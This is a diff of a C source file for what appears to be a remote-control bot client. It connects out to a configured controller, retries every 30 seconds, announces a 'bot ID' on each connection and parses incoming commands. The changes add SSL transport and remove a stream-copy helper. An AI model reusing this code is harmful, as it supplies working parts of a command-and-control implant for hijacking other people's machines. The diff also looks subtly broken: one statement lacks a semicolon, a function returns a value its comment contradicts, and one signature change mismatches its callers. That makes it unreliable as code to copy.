@@ -72,71 +72,11 @@ void uuid4(unsigned char *uuid)
     uuid[8] = 0x80 | (uuid[8] & 0x3f);
 }
 
-// Helper function to copy a data stream between sockets.
-// Since uses low lever file descriptors it works with files and sockets.
-// Optional "count" parameter limits how many bytes to copy,
-// use <0 to copy the entire stream. Returns 0 on success, -1 on error.
-#ifdef _WIN32
-int copy_stream(int source, int destination, ssize_t count)
-{
-    ssize_t copied = 0;
-    ssize_t block = 0;
-    char buffer[1024];
-
-    if (count == 0) return 0;
-    while (count < 0 || copied < count) {
-        block = recv(source, buffer, sizeof(buffer), 0);
-        if (block < 0 || (block == 0 && count > 0 && copied < count)) {
-            return -1;
-        }
-        if (block == 0) {
-            return 0;
-        }
-        copied = copied + block;
-        while (block > 0) {
-            ssize_t tmp = send(destination, buffer, block, 0);
-            if (tmp <= 0) {
-                return -1;
-            }
-            block = block - tmp;
-        }
-    }
-    return 0;
-}
-#else
-int copy_stream(int source, int destination, ssize_t count)
-{
-    ssize_t copied = 0;
-    ssize_t block = 0;
-    char buffer[1024];
-
-    if (count == 0) return 0;
-    while (count < 0 || copied < count) {
-        block = read(source, buffer, sizeof(buffer));
-        if (block < 0 || (block == 0 && count > 0 && copied < count)) {
-            return -1;
-        }
-        if (block == 0) {
-            return 0;
-        }
-        copied = copied + block;
-        while (block > 0) {
-            ssize_t tmp = write(destination, buffer, block);
-            if (tmp <= 0) {
-                return -1;
-            }
-            block = block - tmp;
-        }
-    }
-    return 0;
-}
-#endif
-
 // Helper function to tell if a buffer is zeroed out.
-int is_empty(const unsigned char *buffer, size_t size)
+int is_empty(const char *buffer, size_t size)
 {
-    unsigned char j = 0;
-    unsigned int i;
+    char j = 0;
+    size_t i;
     for (i = 0; i < size; i++) {
         j |= buffer[i];
     }
@@ -146,12 +86,6 @@ int is_empty(const unsigned char *buffer, size_t size)
 // Initialize the parser.
 void parser_init(Parser *parser, const Settings *settings)
 {
-    memcpy(parser->hostname, settings->hostname, sizeof(parser->hostname));
-    parser->port = settings->port;
-    parser->fd = -1;
-    parser->header.cmd_id = 0;
-    parser->header.cmd_len = 0;
-    parser->header.data_len = 0;
 #ifdef _WIN32
     if (is_empty(settings->uuid, sizeof(settings->uuid))) {
         uuid4((unsigned char *) parser->uuid);
@@ -161,6 +95,16 @@ void parser_init(Parser *parser, const Settings *settings)
 #else
     uuid4((unsigned char *) parser->uuid);
 #endif
+    memcpy(parser->hostname, settings->hostname, sizeof(parser->hostname));
+    parser->port = settings->port;
+    parser->fd = -1;
+#ifndef TICK_FEATURES_NO_CRYPTO
+    parser->use_ssl = settings->use_ssl;
+    memset(&parser->ssl, 0, sizeof(parser->ssl));
+#endif
+    parser->header.cmd_id = 0;
+    parser->header.cmd_len = 0;
+    parser->header.data_len = 0;
     memset(parser->buffer, 0, sizeof(parser->buffer));
 }
 
@@ -168,10 +112,13 @@ void parser_init(Parser *parser, const Settings *settings)
 void parser_close(Parser *parser)
 {
     if (parser->fd >= 0) {
-        shutdown(parser->fd, 2);
+        shutdown(parser->fd, 2);    // SHUT_RDWR / SD_BOTH: shut down abruptly
         close(parser->fd);
     }
     parser->fd = -1;
+#ifndef TICK_FEATURES_NO_CRYPTO
+    memset(&parser->ssl, 0, sizeof(parser->ssl));
+#endif
     parser->header.cmd_id = 0;
     parser->header.cmd_len = 0;
     parser->header.data_len = 0;
@@ -185,7 +132,15 @@ void parser_begin_response(Parser *parser, uint8_t status, uint16_t length)
 
     resp.status = status;
     resp.data_len = htonl(length);
+#ifdef TICK_FEATURES_NO_CRYPTO
     send_block(parser->fd, (const char *) &resp, sizeof(resp));
+#else
+    if (parser->use_ssl) {
+        ssl_send_block(&parser->ssl, (const char *) &resp, sizeof(resp));
+    } else {
+        send_block(parser->fd, (const char *) &resp, sizeof(resp));
+    }
+#endif
 }
 
 // Send an empty success response.
@@ -206,7 +161,15 @@ void parser_error(Parser *parser, const char *error)
     }
     parser_begin_response(parser, CMD_STATUS_ERROR, length);
     if (length > 0) {
+#ifdef TICK_FEATURES_NO_CRYPTO
         send_block(parser->fd, error, length);
+#else
+        if (parser->use_ssl) {
+            ssl_send_block(&parser->ssl, error, length);
+        } else {
+            send_block(parser->fd, error, length);
+        }
+#endif
     }
 }
 
@@ -232,7 +195,16 @@ void parser_connect(Parser *parser)
             // Connect to the given hostname and port.
             LOG("Connecting to %s:%d...\n", parser->hostname, parser->port);
             while (parser->fd < 0) {
+#ifdef TICK_FEATURES_NO_CRYPTO
                 parser->fd = connect_to_host(parser->hostname, parser->port);
+#else
+                if (parser->use_ssl) {
+                    parser->fd = -1;
+                    ssl_connect_to_host(&parser->ssl, &parser->fd, parser->hostname, parser->port);
+                } else {
+                    parser->fd = connect_to_host(parser->hostname, parser->port);
+                }
+#endif
                 if (parser->fd < 0) {
                     LOG("Error connecting, waiting 30 seconds to retry...\n");
                     sleep(30);  // Sleep 30 seconds between failed attempts
@@ -242,7 +214,15 @@ void parser_connect(Parser *parser)
             }
 
             // Send the bot ID immediately after a successful (re)connection.
+#ifdef TICK_FEATURES_NO_CRYPTO
             send_block(parser->fd, parser->uuid, sizeof(parser->uuid));
+#else
+            if (parser->use_ssl) {
+                ssl_send_block(&parser->ssl, parser->uuid, sizeof(parser->uuid));
+            } else {
+                send_block(parser->fd, parser->uuid, sizeof(parser->uuid));
+            }
+#endif
 
         // If reconnection is not possible, set a fake quit command.
         // This will kill the listener on error.
@@ -271,7 +251,17 @@ void parser_wait(Parser *parser)
     // If reconnection fails permanently, exit.
     while (1) {
         memset((void *) &parser->header, 0, sizeof(parser->header));
-        if (recv_block(parser->fd, (char *) &parser->header, sizeof(parser->header)) < 0) {
+        int success = 0;
+#ifdef TICK_FEATURES_NO_CRYPTO
+        success = recv_block(parser->fd, (char *) &parser->header, sizeof(parser->header))
+#else
+        if (parser->use_ssl) {
+            success = ssl_recv_block(&parser->ssl, (char *) &parser->header, sizeof(parser->header));
+        } else {
+            success = recv_block(parser->fd, (char *) &parser->header, sizeof(parser->header));
+        }
+#endif
+        if (success < 0) {
             parser_close(parser);
             parser_connect(parser);
             if ( ! parser_is_connected(parser) ) {
@@ -304,7 +294,17 @@ void parser_next(Parser *parser)
         if (extra_data > 0) {
 
             // Skip as many bytes as needed.
-            if (consume_extra_data(parser->fd, extra_data) < 0) {
+            int success = 0;
+#ifdef TICK_FEATURES_NO_CRYPTO
+            success = consume_extra_data(parser->fd, extra_data);
+#else
+            if (parser->use_ssl) {
+                success = ssl_consume_extra_data(&parser->ssl, extra_data);
+            } else {
+                success = consume_extra_data(parser->fd, extra_data);
+            }
+#endif
+            if (success < 0) {
 
                 // On error, reconnect and reset internal variables.
                 parser_connect(parser);
@@ -328,11 +328,9 @@ void parser_next(Parser *parser)
 
 // Read the first argument for the current command into an arbitrary buffer.
 // Note that the argument IS NOT guaranteed to be null terminated!
-// Returns the amount of bytes read on success or -1 on error (and drops the connection).
-ssize_t parser_read_first_arg(Parser *parser, char *buffer, size_t count)
+// Returns 0 on success or -1 on error (and drops the connection).
+int parser_read_first_arg(Parser *parser, char *buffer, size_t count)
 {
-    ssize_t bytes = 0;
-
     // Discard commands where the first argument is larger than the buffer size.
     if ((size_t) parser->header.cmd_len > count) {
         LOG("Error: first argument too long: %d > %d\n", (unsigned int) parser->header.cmd_len, (unsigned int) count);
@@ -342,53 +340,33 @@ ssize_t parser_read_first_arg(Parser *parser, char *buffer, size_t count)
 
     // Load the first argument into the buffer.
     memset((void *) buffer, 0, count);
-    bytes = recv_block(parser->fd, buffer, parser->header.cmd_len);
+    int success = 0;
+#ifdef TICK_FEATURES_NO_CRYPTO
+    success = recv_block(parser->fd, buffer, parser->header.cmd_len);
+#else
+    if (parser->use_ssl) {
+        success = ssl_recv_block(&parser->ssl, buffer, parser->header.cmd_len);
+    } else {
+        success = recv_block(parser->fd, buffer, parser->header.cmd_len);
+    }
+#endif
 
     // On error drop the connection.
-    if (bytes < 0) {
+    if (success < 0) {
         parser_close(parser);
         return -1;
     }
 
     // Update the internal counter.
     parser->header.cmd_len = 0;
-    return bytes;
+    return count;
 }
 
 // Read the first argument for the current command into our internal buffer.
 // When using this function, the argument is guaranteed to be null terminated.
-// Returns the amount of bytes read on success or -1 on error (and drops the connection).
-ssize_t parser_get_first_arg(Parser *parser)
+// Returns 0 on success or -1 on error (and drops the connection).
+int parser_get_first_arg(Parser *parser)
 {
     memset(parser->buffer, 0, sizeof(parser->buffer));
     return parser_read_first_arg(parser, (char *) &parser->buffer, sizeof(parser->buffer) - 1);
-}
-
-// Read the second argument for the current command into an arbitrary buffer.
-// Note that the argument IS NOT guaranteed to be null terminated!
-// Returns the amount of bytes read on success or -1 on error (and drops the connection).
-ssize_t parser_read_second_arg(Parser *parser, char *buffer, size_t count)
-{
-    ssize_t bytes = 0;
-
-    // Discard commands where the second argument is larger than the buffer size.
-    if ((size_t) parser->header.data_len > count) {
-        LOG("Error: second argument too long: %d > %d\n", (unsigned int) parser->header.data_len, (unsigned int) count);
-        parser_error(parser, "second argument to long");
-        return -1;
-    }
-
-    // Load the second argument into the buffer.
-    memset((void *) buffer, 0, count);
-    bytes = recv_block(parser->fd, buffer, parser->header.data_len);
-
-    // On error drop the connection.
-    if (bytes < 0) {
-        parser_close(parser);
-        return -1;
-    }
-
-    // Update the internal counter.
-    parser->header.data_len = 0;
-    return bytes;
 }
